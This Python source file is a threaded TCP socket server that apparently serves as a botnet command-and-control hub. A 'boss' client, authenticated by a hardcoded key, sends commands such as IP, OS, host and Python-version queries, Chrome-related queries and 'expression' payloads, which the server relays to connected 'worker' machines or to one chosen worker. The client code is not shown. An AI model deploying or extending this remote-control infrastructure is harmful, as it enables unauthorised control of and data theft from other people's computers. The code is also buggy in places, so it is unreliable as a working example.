import socket, threading
hostname = socket.gethostname()
# STUFF
workers = []

Job_key = "THIS IS A JOB TASK"
server_private_key = "8d6fsdfh39ur893uruf86we7f58734y uihuhUYGIUDHS*&AD9d8 3yuh78y(*iu(d*&D"
expression_key = "This is an expresiion"
Query_Key = "This is a Query"

# Global variable that mantain client's connections
connections = []

def handle_user_connection(connection: socket.socket, address: str) -> None:
    '''
        Get user connection in order to keep receiving their messages and
        sent to others users/connections.
    '''
    workers.append(address)
    while True:
        try:
            # Get client message
            msg = connection.recv(1024)
            from_boss = False
            Job_related = False

            # If no message is received, there is a chance that connection has ended
            # so in this case, we need to close connection and remove it from connections list.
            if msg:
                if server_private_key in msg.decode():
                    from_boss = True
                if Job_key in msg.decode():
                    Job_related = True
                # Log message sent by user
                m = msg.decode()

                if from_boss == True:
                    print(f'BOS {address[0]}:{address[1]} - {m[len(server_private_key):]}')
                    if m[len(server_private_key):] == "IP":
                        broadcast(Job_key + "Get IP", connection)

                    if m[len(server_private_key):] == "PYV":
                        broadcast(Job_key + "Get python version", connection)

                    if m[len(server_private_key):] == "HOST":
                        broadcast(Job_key + "hostthing", connection)

                    if "CHROME " in m[len(server_private_key):]:
                        n = m[len(server_private_key):]
                        query = n.strip("CHROME ")
                        broadcast(Job_key + Query_Key + query, connection)

                    if m[len(server_private_key):] == "CHROME":
                        broadcast(Job_key + "thing", connection)


                    if m[len(server_private_key):] == "OS":
                        broadcast(Job_key + "bruh", connection)

                    if "whisp " in m[len(server_private_key):]:
                        t = m[len(server_private_key):]
                        x = t.strip("whisp ")
                        args = x.split()
                        print (args[0] + " " + args[1])
                        whisper(args[0], Job_key + args[1], connection)


                    if expression_key in m[len(server_private_key):]:
                        n = m[len(server_private_key):]
                        exp = n[len(expression_key):]
                        broadcast(expression_key + str(exp), connection)


                elif Job_related == True:
                    print(f'JOB {address[0]}:{address[1]} - {msg.decode().strip(Job_key)}')
                    print (msg.decode().strip(Job_key))

                else:
                    print(f'MSG {address[0]}:{address[1]} - {msg.decode()}')
                    msg_to_send = f'From {address[0]}:{address[1]} - {msg.decode()}'

                # Build message format and broadcast to users connected on server
                msg_to_send = f'From {address[0]}:{address[1]} - {msg.decode()}'
                broadcast(msg_to_send, connection)
                # Example:
                # broadcast(Job_key + "do this thing", connection)


            # Close connection if no message was sent
            else:
                remove_connection(connection)
                break

        except Exception as e:
            print(f'Error to handle user connection: {e}')
            remove_connection(connection)
            break


def broadcast(message: str, connection: socket.socket) -> None:
    '''
        Broadcast message to all users connected to the server
    '''

    # Iterate on connections in order to send message to all client's connected
    for client_conn in connections:
        # Check if isn't the connection of who's send
        if client_conn != connection:
            try:
                # Sending message to client connection
                client_conn.send(message.encode())

            # if it fails, there is a chance of socket has died
            except Exception as e:
                print('Error broadcasting message: {e}')
                remove_connection(client_conn)

def whisper(worker, message: str, connection:socket.socket) -> None:
    '''
    send a message to a specific worker
    '''
    for client_conn in connections:
        if worker in str(client_conn):
            target = client_conn
            break
    target.send(message.encode())



def remove_connection(conn: socket.socket) -> None:
    '''
        Remove specified connection from connections list
    '''

    # Check if connection exists on connections list
    if conn in connections:
        # Close socket connection and remove connection from connections list
        conn.close()
        connections.remove(conn)


def server() -> None:
    '''
        Main process that receive client's connections and start a new thread
        to handle their messages
    '''

    LISTENING_PORT = 12000
    
    try:
        # Create server and specifying that it can only handle 4 connections by time!
        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_instance.bind(('', LISTENING_PORT))
        socket_instance.listen(4)

        print('Server running!')
        print ("Your server is running on IP: " + socket.gethostbyname(hostname) + " on PORT: " + str(LISTENING_PORT))
        
        while True:

            # Accept client connection
            socket_connection, address = socket_instance.accept()
            # Add client connection to connections list
            connections.append(socket_connection)
            # Start a new thread to handle client connection and receive it's messages
            # in order to send to others connections
            threading.Thread(target=handle_user_connection, args=[socket_connection, address]).start()

    except Exception as e:
        print(f'An error has occurred when instancing socket: {e}')
    finally:
        # In case of any problem we clean all connections and close the server connection
        if len(connections) > 0:
            for conn in connections:
                remove_connection(conn)

        socket_instance.close()


if __name__ == "__main__":
    server()
